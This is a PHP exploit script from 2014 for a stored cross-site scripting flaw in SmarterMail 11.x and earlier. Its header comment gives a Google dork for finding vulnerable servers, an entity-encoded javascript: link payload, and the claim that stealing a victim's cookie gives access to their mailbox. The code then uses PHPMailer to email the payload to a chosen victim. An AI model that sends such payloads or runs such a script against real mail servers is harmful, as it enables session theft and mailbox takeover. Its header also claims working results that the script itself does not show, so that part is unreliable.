<?php

/*
# Exploit Title: SmarterMail Enterprise and Standard <=11.x Stored XSS
# Google Dork: intext:"SmarterTools Inc." inurl:login.aspx
# Date: 15 Jan 2014
# Exploit Author: Saeed reza Zamanian  [s.zamanian [AT] imenantivirus.com]
# Vendor Homepage: http://www.smartertools.com/
# Software Link (Standard Version): http://www.smartertools.com/smartermail/mail-server-download.aspx
# Version: <= 11.x
# Tested on: Windows 2008 R2 HTTPServer[Microsoft-IIS/7.5] ASP_NET[4.0.30319]
# CVE : vendor id=2560

Greetz:  H.Zamanian, K.Kia, K.Khani

WebApp Desciption:
	SmarterMail delivers Exchange-level email server software and instant messaging for a fraction of the cost. With lower hardware requirements, superior stability and reduced maintenance costs, SmarterMail has significantly lower TCO and is the best-in-class of Microsoft Exchange alternative for businesses and hosting companies.

Vulnerability Description:
	 XSS codes can be stored in E-Mail Body.
	So you can send an email to the Victim with below payload and steal the victim's cookie.

	<a href=&#106;&#97;&#118;&#97;&#83;&#99;&#82;&#105;&#112;&#116;:alert(document.cookie)>Click Me, Please...</a>\r\n

	 NOTE: javascript html char encode = &#106;&#97;&#118;&#97;&#83;&#99;&#82;&#105;&#112;&#116;

	then you will be able to get into the victim's mailbox via the url:
	http://[WebSite]/[Smarter]/Default.aspx

## I used phpmailer class for beside of the exploit so you need to download it here and run the exploit in the phpmailer directory:
	http://code.google.com/a/apache-extras.org/p/phpmailer/downloads/list


*/

echo "<title>SmarterMail Enterprise and Standard <= 11.X XSS Exploit</title>";
require_once('class.phpmailer.php');

$mail = new PHPMailer(true); // the true param means it will throw exceptions on errors, which we need to catch
$mail->IsSMTP(); // telling the class to use SMTP


/* SETTINGS */
$smtp_user = "attacker[at]email.com"; 	// any valid smtp account
$smtp_pass = "PASSWORD";		// Your PASSWORD
$smtp_port = "25";			// SMTP PORT Default: 25
$smtp_host = "mail.email.com"; 		// any valid smtp server
$victim = "victim@mail.com";
$subject = "Salam";
$body = '<a href=&#106;&#97;&#118;&#97;&#83;&#99;&#82;&#105;&#112;&#116;:alert("XSS")>Click Me, Please...</a>\r\n';


try {
  $mail->SMTPDebug  = 2;                  // enables SMTP debug information (for testing)
  $mail->SMTPAuth   = true;               // enable SMTP authentication
  $mail->Host       = $smtp_host;
  $mail->Port       = $smtp_port;
  $mail->Username   = $smtp_user; 	 // SMTP account username
  $mail->Password   = $smtp_pass;        // SMTP account password

  $mail->SetFrom($smtp_user, 'Attacker');
  $mail->AddReplyTo($smtp_user, 'Attacker');

  $mail->AddAddress($victim, 'Victim');
  $mail->Subject = $subject;

  $mail->MsgHTML($body);
  $mail->Send();
  echo "Message Sent OK</p>\n";
} catch (phpmailerException $e) {
  echo $e->errorMessage();
} catch (Exception $e) {
  echo $e->getMessage();
}
?>

</body>
</html>